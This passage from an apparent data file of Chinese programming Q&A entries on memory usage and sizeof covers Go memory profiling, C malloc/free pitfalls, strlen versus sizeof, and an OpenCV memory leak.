1&amp;lt;&amp;lt;10\n    var ms1, ms2 runtime.MemStats\n    runtime.ReadMemStats(&amp;amp;ms1)\n    nm = NewMatrix(n, m)\n    WriteMatrix(nm)\n    runtime.ReadMemStats(&amp;amp;ms2)\n    fmt.Println(runtime.GOARCH, runtime.GOOS)\n    fmt.Println(\"Actual:  \", ms2.TotalAlloc-ms1.TotalAlloc)\n    fmt.Println(\"Estimate:\", n*3*8+n*m*8)\n    fmt.Println(\"Total:   \", ms2.TotalAlloc)\n    fmt.Println(\"Size:    \", MatrixSize(nm))\n\n    // check top VIRT and RES for COMMAND peter\n    for {\n        WriteMatrix(nm)\n    }\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Output:&lt;/p&gt;\n\n&lt;pre&gt;\n$ go build peter.go &amp;amp;&amp;amp; /usr/bin/time -f \"%M KiB\" ./peter\namd64 linux\nActual:   269221888\nEstimate: 269221888\nTotal:    269240592\nSize:     269221888\n^C\nCommand exited with non-zero status 2\n265220 KiB\n$\n\n$ top\nVIRT 284268 RES 265136 COMMAND peter\n&lt;/pre&gt;\n\n&lt;p&gt;Is this what you expected?&lt;/p&gt;\n\n&lt;p&gt;See &lt;code&gt;MatrixSize&lt;/code&gt; for the correct way to calculate the memory size.&lt;/p&gt;\n\n&lt;p&gt;In the infinite loop that allows us to use the &lt;code&gt;top&lt;/code&gt; command, pin the matrix as resident by updating it.&lt;/p&gt;\n\n&lt;p&gt;What results do you get when you run this program?&lt;/p&gt;\n\n&lt;hr&gt;\n\n&lt;p&gt;BUG:&lt;/p&gt;\n\n&lt;p&gt;Your result from &lt;code&gt;/usr/bin/time&lt;/code&gt; is  &lt;code&gt;1056992 KiB&lt;/code&gt; which too large by a factor of four. It's a bug in your version of &lt;code&gt;/usr/bin/time&lt;/code&gt;, &lt;code&gt;ru_maxrss&lt;/code&gt; is reported in KBytes not pages. My version of Ubuntu has been patched.&lt;/p&gt;\n\n&lt;p&gt;References:&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"https://groups.google.com/forum/#!topic/gnu.utils.help/u1MOsHL4bhg\" rel=\"nofollow\"&gt;Re: GNU time: incorrect results&lt;/a&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"http://lists.gnu.org/archive/html/bug-gnu-utils/2013-02/msg00019.html\" rel=\"nofollow\"&gt;time-1.7 counts rusage wrong on Linux&lt;/a&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"http://ftp.gnu.org/gnu/time/\" rel=\"nofollow\"&gt;GNU Project Archives: time&lt;/a&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"https://launchpad.net/ubuntu/+source/time/1.7-24\" rel=\"nofollow\"&gt;“time” 1.7-24 source package in Ubuntu&lt;/a&gt;. &lt;code&gt;ru_maxrss&lt;/code&gt; is reported in KBytes not pages. (Closes: #649402)  &lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=649402\" rel=\"nofollow\"&gt;#649402 - [PATCH] time overestimates max RSS by a factor of 4 - Debian Bug report logs&lt;/a&gt;&lt;/p&gt;\n\n&lt;blockquote&gt;\n  &lt;p&gt;Subject: Fix ru_maxrss reporting Author: Richard Kettlewell\n  Bug-Debian: &lt;a href=\"http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=649402\" rel=\"nofollow\"&gt;http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=649402&lt;/a&gt;&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;--- time-1.7.orig/time.c\n+++ time-1.7/time.c\n@@ -392,7 +398,7 @@\n             ptok ((UL) resp-&amp;gt;ru.ru_ixrss) / MSEC_TO_TICKS (v));\n        break;\n      case 'M':       /* Maximum resident set size.  */\n-       fprintf (fp, \"%lu\", ptok ((UL) resp-&amp;gt;ru.ru_maxrss));\n+       fprintf (fp, \"%lu\", (UL) resp-&amp;gt;ru.ru_maxrss);\n        break;\n      case 'O':       /* Outputs.  */\n        fprintf (fp, \"%ld\", resp-&amp;gt;ru.ru_oublock);\n&lt;/code&gt;&lt;/pre&gt;\n&lt;/blockquote&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在Go中对内存进行概要分析时，结果似乎不一致", ["\n\n", "I have recently been running some numerical codes written in Go on large datasets and have been encountering memory management issues. While attempting to profile the problem, I have measured the memory usage of my program in three different ways: with Go's ", "runtime/pprof", " package, with the unix ", "time", " utility, and by manually adding up the size of the data that I allocated. These three methods do not give me consistent results.", "\n\n", "Below is a simplified version of the code that I am profiling. It allocates several slices, puts values at every index and places each of them inside of a parent slice:", "\n\n", "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n\n    \"runtime/pprof\"\n    \"unsafe\"\n    \"flag\"\n)\n\nvar mprof = flag.String(\"mprof\", \"\", \"write memory profile to this file\")\n\nfunc main() {\n    flag.Parse()\n\n    N := 1<<15\n    psSlice := make([][]int64, N)\n    _ = psSlice\n    size := 0\n\n    for i := 0; i < N; i++ {\n        ps := make([]int64, 1<<10)\n        for i := range ps { ps[i] = int64(i) }\n        psSlice[i] = ps\n        size += int(unsafe.Sizeof(ps[0])) * len(ps)\n    }\n\n    if *mprof != \"\" {\n        f, err := os.Create(*mprof)\n        if err != nil { panic(err) }\n        pprof.WriteHeapProfile(f)\n        f.Close()\n    }\n\n    fmt.Printf(\"total allocated: %d MB\n\", size >> 20)\n}\n", "\n\n", "Running this with the command ", "$ time time -f \"%M kB\" ./mem_test -mprof=out.mprof", " results in the output:", "\n\n", "total allocated: 256 MB\n1141216 kB\n\nreal    0m0.150s\nuser    0m0.031s\nsys 0m0.113s\n", "\n\n", "Here the first number, 256 MB, is just the size of the arrays computed from ", "unsafe.Sizeof", " and the second number, 1055 MB, is what ", "time", " reports. Running the pprof tool results in", "\n\n", "(pprof) top1\nTotal: 108.2 MB\n   107.8  99.5%  99.5%    107.8  99.5% main.main\n", "\n\n", "These results scale smoothly in the way you would expect them to for slices of smaller or larger lengths.", "\n\n", "Why don't these three number line up more closely?", "\n    "]], "Tag": "程序设计"}
{"Answer": "#define STACK_INIT_SIZE 100\r\n#define STACKINCREMENT 10\r\n\r\n宏定义不要加分号在后面", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["malloc与realloc问题（C数据结构）", ["如下代码所示，关于malloc与realloc出现5处错误：", "\n\n", "#include <stdio.h>\n#include <stdlib.h>\n#define STACK_INIT_SIZE 100;\n#define STACKINCREMENT 10;\n\ntypedef struct{\n    int *base;\n    int *top;\n    int stacksize;\n}SqStack;\n\nvoid InitStack(SqStack S){\n    S.base=(int *)malloc(STACK_INIT_SIZE*sizeof(int));\n    S.top=S.base;\n    S.stacksize=STACK_INIT_SIZE;\n}//___________________InitStack_______________________\n\nvoid Push(SqStack S,int e){\n    if(S.top==S.base){\n        S.base=(int *)realloc(S.base,(S.stacksize+STACKINCREMENT)*sizeof(int));\n        S.top=S.base+S.stacksize;\n        S.stacksize+=STACKINCREMENT;\n    }\n    *S.top=e;\n    S.top++;\n}\n\n\nvoid main(){\n    SqStack S;\n    InitStack(S);\n    Push (S,5);\n}\n\n", "\n\n", "SqStack.c", "\nD:\\VC6\\pvc6\\COMMON\\MSDEV98\\BIN\\SqStack.c(13) : error C2143: syntax error : missing ')' before ';'", "\nD:\\VC6\\pvc6\\COMMON\\MSDEV98\\BIN\\SqStack.c(13) : error C2059: syntax error : ')'", "\nD:\\VC6\\pvc6\\COMMON\\MSDEV98\\BIN\\SqStack.c(13) : error C2100: illegal indirection", "\nD:\\VC6\\pvc6\\COMMON\\MSDEV98\\BIN\\SqStack.c(20) : error C2143: syntax error : missing ')' before ';'", "\nD:\\VC6\\pvc6\\COMMON\\MSDEV98\\BIN\\SqStack.c(20) : error C2143: syntax error : missing ';' before ')'", "\nError executing cl.exe.", "\n\n", "SqStack.obj - 5 error(s), 0 warning(s)", "\n\n", "求大佬解答~~"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;free(ptr) 不会改变 ptr 变量本身的值&amp;#xff0c;调用 free() 后它仍然会指向相同的内存空间&amp;#xff0c;但是此时该内存已无效&amp;#xff0c;不能被使用。所以建议手动将 ptr 的值设置为 NULL。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["free指针时，无法释放内存泄漏", ["问题遇到的现象和发生背景", "\n", "在一个结构体内嵌套一个结构体指针，给嵌套的结构体指针开辟空间，free时失败。", "\n", "问题相关代码，请勿粘贴截图", "\n", "typedef struct    {", "  char *memory;", "  size_t size;", "}MemoryStruct;", "\n", "typedef struct{", "    Xml_cb cllbackFuntion;", "    void *pArgs; //for register buffer", "    MemoryStruct *pData;", "    char *KeySet;", "    MS_U32 u32KeySetSize;", "}XML_PARSER_PARAM;", "\n", "MS_BOOL _XML_Parse(MemoryStruct pData)", "{", "    MS_BOOL bRet = FALSE;", "    MS_U32 u32SpecificKeySetSize;", "    XML_PARSER_PARAM *xData = NULL;", "        char *u8SpecificKeySet[]=", "        {", "        \"cdbs:Root\",", "        \"cdbs:RootMenu\",", "        \"cdbs:Menu\",", "        \"cdbs:Image\",", "        \"cdbs:Text\",", "        \"cdbs:Table\",", "        \"cdbs:Head\",", "        \"cdbs:Content\",", "        \"cdbs:Title\",", "        \"cdbs:ColorMode\",", "        \"cdbs:ColorSelect\",", "        \"cdbs:ColorSectionS\",", "        \"cdbs:ColorSectionN\",", "        \"cdbs:ColorTitleS\",", "        \"cdbs:ColorTitleN\",", "        \"cdbs:ColorText\",", "        \"cdbs:ColorTableL\",", "        \"cdbs:ColorTableH\",", "        \"cdbs:ColorTableC\",", "        };", "\n", "u32SpecificKeySetSize = sizeof(u8SpecificKeySet)/sizeof(MS_U8*);\nmemset(&stxmlList, ", "0", ", sizeof(stXMLList));\n\nxData = (XML_PARSER_PARAM *)malloc( sizeof(XML_PARSER_PARAM) );\n", "if", "(xData == ", "NULL", ")\n    ", "goto", " fail;\nxData->pData = (MemoryStruct *)malloc( sizeof(MemoryStruct) );\n\n", "if", "(xData->pData == ", "NULL", ")\n    ", "goto", " fail;\n\nxData->cllbackFuntion = _XML_Cuba_List;\nxData->pArgs = &stxmlList;\nxData->pData->size = pData.size;\nxData->pData->memory = pData.memory;\nxData->KeySet = (char*)u8SpecificKeySet;\nxData->u32KeySetSize = u32SpecificKeySetSize;\nbRet = App_XMLParser(xData);\n\nfree( (xData->pData) );\n(xData->pData)=", "NULL", ";    \nfree( xData );    \n xData=", "NULL", ";\n\n", "if", "(xData->pData==", "NULL", ")", "//----------->该指针不等于NULL，free失败", "\n    printf(", "\"\\n@@@@ xData->pData free succeed@@@@\\n\"", ");\n", "else", "\n    printf(", "\"\\n @@@ xData->pData free fail @@@@\\n\"", ");\n\n", "if", "(xData==", "NULL", ")\n    printf(", "\"\\n@@@@ xData free succeed@@@@\\n\"", ");\n", "else", "\n    printf(", "\"\\n @@@ xData free fail @@@@\\n\"", ");\n", "return", " bRet;\n\n\nfail:\n    ", "if", "(xData->pData != ", "NULL", ")\n        free(xData->pData);\n    ", "if", "(xData != ", "NULL", ")\n        free(xData);\n    ", "return", " ", "FALSE", ";\n", "\n", "}", "\n", "viod main（void）", "{", "          MemoryStruct xmlData;", "        xmlData=Mapp_GetFile_Data(global_f,(U8 *)buf,sizeof(buf)/sizeof(char)-1);", "       _XML_Parse_Cuba(xmlData);", "}", "\n", "运行结果及报错内容", "\n", "xData->pData free后没有变为NULL", "\n", "我的解答思路和尝试过的方法", "\n", "我想要达到的结果", "\n", "xData->pData free后要变成NULL指针"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;两个问题&lt;/p&gt;\n&lt;ul&gt;&lt;li&gt;判断相等写成了单个&amp;#61;&lt;/li&gt;&lt;li&gt;初始化方式错了&lt;/li&gt;&lt;/ul&gt;\n&lt;p&gt;这里判断相等写错了&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/728119079056158.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;br /&gt;main函数中初始化方式错了&lt;br /&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/993519079056183.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;br /&gt;对应的访问方式也需要更改&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;-&amp;gt;&lt;/code&gt;用于结构体指针&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;.&lt;/code&gt;用于结构体变量&lt;br /&gt;所有函数里面的Q都需要改成&lt;code class=\"language-javascript\"&gt;&amp;amp;Q&lt;/code&gt;&lt;br /&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/32371907905611.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;br /&gt;修改完毕后&amp;#xff0c;代码可以运行了&amp;#xff0c;但是有没有逻辑错误我不知道&lt;p&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;如果对你有帮助&amp;#xff0c;还请点个采纳&amp;#xff0c;万分感谢&amp;#xff01;&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; OK 1&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; ERROR 0&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; INFEASIBLE -1&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; OVERFLOW -2&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; Status;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; QElemType;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;SqQueue&lt;/span&gt;\n{\n    QElemType* base;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; front;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; rear;\n}SqQueue;\n\n&lt;span class=\"hljs-function\"&gt;Status &lt;span class=\"hljs-title\"&gt;InitQueue&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(SqQueue* Q, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n)&lt;/span&gt;\n&lt;/span&gt;{\n    Q-&amp;gt;base &amp;#61; (QElemType*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(n * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(QElemType));\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!Q-&amp;gt;base) &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;(OVERFLOW);\n    Q-&amp;gt;front &amp;#61; Q-&amp;gt;rear &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; OK;\n}\n\n&lt;span class=\"hljs-comment\"&gt;//int QueueLength(SqQueue *Q)&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//{&lt;!-- --&gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//    return (Q-&amp;gt;rear-Q-&amp;gt;front&amp;#43;MAXSIZE)%MAXSIZE;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//}&lt;/span&gt;\n\n&lt;span class=\"hljs-function\"&gt;Status &lt;span class=\"hljs-title\"&gt;EnQueue&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(SqQueue* Q, QElemType e, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; ((Q-&amp;gt;rear &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;) % n &amp;#61;&amp;#61; Q-&amp;gt;front) &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ERROR;\n    Q-&amp;gt;base[Q-&amp;gt;rear] &amp;#61; e;\n    Q-&amp;gt;rear &amp;#61; (Q-&amp;gt;rear &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;) % n;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; OK;\n}\n&lt;span class=\"hljs-comment\"&gt;// Status Queue(SqQueue *Q){&lt;!-- --&gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//     while&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;// }&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;DeQueue&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(SqQueue* Q, QElemType* e, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (Q-&amp;gt;base[Q-&amp;gt;front] &amp;#61;&amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;) {\n        Q-&amp;gt;front &amp;#61; (Q-&amp;gt;front &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;) % n;\n    }\n    *e &amp;#61; Q-&amp;gt;base[Q-&amp;gt;front];\n    Q-&amp;gt;front &amp;#61; (Q-&amp;gt;front &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;) % n;\n}\n\n&lt;span class=\"hljs-comment\"&gt;//Status GetHead(SqQueue *Q,QElemType *e)&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//{&lt;!-- --&gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//    if(Q-&amp;gt;rear&amp;#61;&amp;#61;Q-&amp;gt;front) return ERROR;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//    *e&amp;#61;Q-&amp;gt;base[Q-&amp;gt;front];&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//    return OK;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//}&lt;/span&gt;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;DestroyQueue&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(SqQueue* Q)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (Q-&amp;gt;base) &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(Q-&amp;gt;base);\n    Q-&amp;gt;base &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    Q-&amp;gt;front &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    Q-&amp;gt;rear &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    SqQueue Q;\n    &lt;span class=\"hljs-comment\"&gt;//自行编写代码&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n;\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;n);\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; m;\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;m);\n    &lt;span class=\"hljs-built_in\"&gt;InitQueue&lt;/span&gt;(&amp;amp;Q, n);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;&amp;#43;&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; i &amp;lt;&amp;#61; n; i&amp;#43;&amp;#43;) {\n        &lt;span class=\"hljs-built_in\"&gt;EnQueue&lt;/span&gt;(&amp;amp;Q, i, n);\n    }\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; e;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; k &amp;#61; n;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (k !&amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;) {\n        &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; f;\n        &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; m; j&amp;#43;&amp;#43;) {\n            &lt;span class=\"hljs-built_in\"&gt;DeQueue&lt;/span&gt;(&amp;amp;Q, &amp;amp;f, n);\n        }\n        Q.base[Q.front] &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n        k--;\n    }\n    &lt;span class=\"hljs-built_in\"&gt;DeQueue&lt;/span&gt;(&amp;amp;Q, &amp;amp;e, n);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, e);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["malloc无法分配内存", ["为什么malloc无法正常分配内存", "\n", "\n", "#include <stdio.h>", "\n", "#include <stdlib.h>", "\n", "#define OK 1", "\n", "#define ERROR 0", "\n", "#define INFEASIBLE -1", "\n", "#define OVERFLOW -2", "\ntypedef ", "int", " Status;\ntypedef ", "int", " QElemType;\ntypedef struct\n{\n    QElemType *base;\n    ", "int", " front;\n    ", "int", " rear;\n}SqQueue;\n\nStatus InitQueue(SqQueue *Q,", "int", " n)\n{\n    Q->base= (QElemType *)malloc(n*sizeof(QElemType));\n    ", "if", "(!Q->base) ", "exit", "(OVERFLOW);\n    Q->front=Q->rear=", "0", ";\n    ", "return", " OK;\n}\n\n", "//int QueueLength(SqQueue *Q)", "\n", "//{", "\n", "//    return (Q->rear-Q->front+MAXSIZE)%MAXSIZE;", "\n", "//}", "\n\nStatus EnQueue(SqQueue *Q,QElemType e,", "int", " n)\n{\n    ", "if", "((Q->rear+", "1", ")%n==Q->front) ", "return", " ", "ERROR", ";\n    Q->base[Q->rear]=e;\n    Q->rear=(Q->rear+", "1", ")%n;\n    ", "return", " OK;\n}\n", "// Status Queue(SqQueue *Q){", "\n", "//     while", "\n", "// }", "\n", "void", " DeQueue(SqQueue *Q,QElemType *e,", "int", " n)\n{\n    ", "while", "(Q->base[Q->front]=", "0", "){\n        Q->front=(Q->front+", "1", ")%n;\n    }\n    *e=Q->base[Q->front];\n    Q->front=(Q->front+", "1", ")%n;\n}\n\n", "//Status GetHead(SqQueue *Q,QElemType *e)", "\n", "//{", "\n", "//    if(Q->rear==Q->front) return ERROR;", "\n", "//    *e=Q->base[Q->front];", "\n", "//    return OK;", "\n", "//}", "\n\n", "void", " DestroyQueue(SqQueue *Q)\n{\n    ", "if", "(Q->base) free(Q->base);\n    Q->base=", "NULL", ";\n    Q->front=", "0", ";\n    Q->rear=", "0", ";\n}\n\n", "int", " main()\n{\n    SqQueue *Q;\n    ", "//自行编写代码", "\n    ", "int", " n;\n    scanf(", "\"%d\"", ",&n);\n    ", "int", " m;\n    scanf(", "\"%d\"", ",&m);\n    InitQueue(Q,n);\n    printf(", "\"+\"", ");\n    ", "for", " (", "int", " i=", "1", ";i<=n;i++){\n        EnQueue(Q,i,n);\n    }\n    ", "int", " e;\n    ", "int", " k=n;\n    ", "while", "(k!=", "1", "){\n        ", "int", " f;\n        ", "for", "(", "int", " j=", "0", ";j<m;j++){\n            DeQueue(Q,&f,n);\n        }\n        Q->base[Q->front]=", "0", ";\n        k--;\n    }\n    DeQueue(Q,&e,n);\n    printf(", "\"%d\"", ",e);\n    ", "return", " ", "0", ";\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img width=\"600px\" align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/422178493236176.png\" /&gt;&lt;/p&gt;等价&lt;br /&gt;strlen()遇到‘\\0’停止&amp;#xff0c;最终统计的字符串长度不包括\\0&lt;br /&gt;sizeof()最终统计的字符串长度包括\\0&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["strlen与sizeof的输出结果为什么是这样？", ["strlen为什么是2", "sizeof为什么是3"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;strlen是计算有效字串的长度的&amp;#xff0c;它是以字串结尾符作为终止的&amp;#xff0c;不包括结尾符哦。这里应该是 3&lt;br /&gt;sizeof就相当于计算一个&amp;#34;容器&amp;#34;的大小了&amp;#xff0c;它能装多少东西。这里应该是11&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言中sizeof和strlen的区别", ["如图，在这道题中主要考察了strlen和sizeof的区别。但是为什么会有区别呢？还请求大神们帮忙解答一下了，谢谢了！"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;From the &lt;a href=\"http://www.open-std.org/JTC1/sc22/wg14/www/docs/n1256.pdf\" rel=\"noreferrer\"&gt;C99 Standard&lt;/a&gt; (the emphasis is mine)&lt;/p&gt;\n\n&lt;blockquote&gt;\n  &lt;p&gt;6.5.3.4/2&lt;/p&gt;\n  \n  &lt;p&gt;The sizeof operator yields the size (in bytes) of its operand, which may be an expression or the parenthesized name of a type. The size is determined from the type of the operand. The result is an integer. If the type of the operand is a variable length array type, the operand is evaluated; otherwise, &lt;strong&gt;the operand is not evaluated&lt;/strong&gt; and the result is an integer constant.&lt;/p&gt;\n&lt;/blockquote&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么(x + +)的大小不增加 x？", ["\n\n", "Here is the code compiled in dev c++ windows:", "\n\n", "#include <stdio.h>\n\nint main() {\n    int x = 5;\n    printf(\"%d and \", sizeof(x++)); // note 1\n    printf(\"%d\\n\", x); // note 2\n    return 0;\n}\n", "\n\n", "I expect ", "x", " to be 6 after executing ", "note 1", ". However, the output is:", "\n\n", "4 and 5\n", "\n\n", "Can anyone explain why ", "x", " does not increment after ", "note 1", "?", "\n    ", "\n\n", "转载于:https://stackoverflow.com/questions/8225776/why-does-sizeofx-not-increment-x"]], "Tag": "程序设计"}
{"Answer": "1.建议将下面2行代码移到while循环里面最后的位置看看。\r\n    cvReleaseImage(&amp;dsw);\r\n    cvReleaseImage(&amp;dst);", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求大神寻找这段写视频代码的内存泄漏之处，菜鸟我实在找不出了", ["求大神围观~", "\n\n", " // OpenCVFindContours.cpp : 定义控制台应用程序的入口点。\n//\n#include \"stdafx.h\"  \n#include \"cxcore.h\"   \n#include \"cv.h\"   \n#include \"highgui.h\"  \n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    CvCapture* pCapture = cvCreateCameraCapture(0);\n    IplImage * pFrame;\n    IplImage *psrc;\n    IplImage *src = cvCreateImage(cvSize(700,700), IPL_DEPTH_8U,3);\n    IplImage *gsrc = cvCreateImage(cvGetSize(src), IPL_DEPTH_8U,1);\n\n    IplImage *dsw ;\n    IplImage *dst;\n    CvMemStorage *storage;\n    CvSeq *first_contour;\n\n    while(1)\n    {\n        psrc=cvQueryFrame(pCapture ); \n\n        cvResize(psrc,src,1);\n        cvCvtColor(src,gsrc,CV_BGR2GRAY);\n\n        dsw = cvCreateImage(cvGetSize(src), 8, 1);  \n        dst = cvCreateImage(cvGetSize(src), 8, 3);\n\n        storage = cvCreateMemStorage(0);  \n        first_contour = NULL;  \n\n        //turn the src image to a binary image  \n        //cvThreshold(src, 